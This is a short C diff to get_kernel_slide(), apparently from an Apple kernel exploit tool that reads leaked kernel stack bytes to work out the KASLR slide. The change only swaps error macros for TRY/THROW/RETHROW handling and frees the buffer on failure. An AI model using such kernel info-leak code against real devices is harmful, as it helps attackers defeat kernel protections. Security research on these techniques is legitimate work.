@@ -4,8 +4,9 @@
 #include <stdlib.h>             // malloc
 #include <string.h>             // strerror
 
-#include "common.h"             // DEBUG, ERROR, PRINT_BUF, SIZE
+#include "common.h"             // DEBUG, PRINT_BUF, SIZE
 #include "io.h"                 // kOS*, dict_get_bytes
+#include "try.h"                // THROW, TRY, RETHROW
 
 #include "slide.h"
 
@@ -34,10 +35,17 @@ size_t get_kernel_slide()
         size_t *buf = malloc(bufsize);
         if(buf == NULL)
         {
-            ERROR("Failed to allocate buffer (%s)", strerror(errno));
+            THROW("Failed to allocate buffer (%s)", strerror(errno));
         }
 
-        dict_get_bytes(dict, sizeof(dict), key, buf, &buflen);
+        TRY
+        ({
+            dict_get_bytes(dict, sizeof(dict), key, buf, &buflen);
+        })
+        RETHROW
+        ({
+            free(buf);
+        })
 
         PRINT_BUF("Kernel stack", buf, buflen);
         // read value after OSNumber on the stack
